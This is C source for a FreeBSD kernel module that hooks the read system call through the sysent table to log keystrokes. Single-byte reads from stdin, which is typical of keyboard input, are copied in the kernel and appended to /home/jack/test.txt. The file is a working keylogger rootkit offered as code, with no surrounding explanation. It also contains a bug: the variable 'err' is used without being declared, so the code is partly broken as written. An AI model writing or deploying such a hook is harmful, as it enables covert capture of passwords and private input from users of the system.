#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

#include <sys/uio.h>
#include <sys/syscallsubr.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <sys/unistd.h>

#include <sys/sx.h>

static int write_hook(struct thread *td, struct write_args *uap);
static struct sx file_lock;

static int read_hook(struct thread *td, void *syscall_args)
{
	struct read_args *uap;
	uap = (struct read_args *)syscall_args;
	
	int error;
	char buf[1];
	//buf[1] = '\n';
	size_t done;

	error = sys_read(td, syscall_args);

	// We only care about input from stdin
	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd !=0))
		return error;
	
	copyinstr(uap->buf, buf, 1, &done);

	sx_xlock(&file_lock);

	struct write_args w_args;

	// sys_open is a wrapper around kern_openat for processes from userspace, we bypass that.
	kern_openat(td, AT_FDCWD, "/home/jack/test.txt", UIO_SYSSPACE, O_RDWR | O_CREAT | O_APPEND, 0777 );
	w_args.fd = td->td_retval[0];
	w_args.buf = (void *)buf;
	w_args.nbyte = 1;

	// Ignore errors we don't care about them :P
	write_hook(td, &w_args);

	// Write a '\n' after. 
	buf[0] = '\n';
	err = write_hook(td, &w_args);

	kern_close(td, w_args.fd);

	sx_xunlock(&file_lock);

	return error;
}

// This is pretty much the same as what the actual sys_write looks like
// the only difference is we set uio_segflg to UIO_SYSSPACE 
static int write_hook(struct thread *td, struct write_args *uap)
{
	struct uio auio;
	struct iovec aiov;

	int error;

	aiov.iov_base = (void *)(uintptr_t)uap->buf;
	aiov.iov_len = uap->nbyte;

	auio.uio_iov = &aiov;
	auio.uio_iovcnt = 1;
	auio.uio_resid = uap->nbyte;
	auio.uio_segflg = UIO_SYSSPACE;

	error = kern_writev(td, uap->fd, &auio);

	return error;
}



static int load (struct module *module, int cmd, void *args)
{
	int error = 0;

	switch (cmd) {
		case MOD_LOAD: 
			sx_init(&file_lock, "lock");
			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			break;

		case MOD_UNLOAD:
			sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

static moduledata_t read_hook_mod = {
	"read_hook",
	load,
	NULL
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
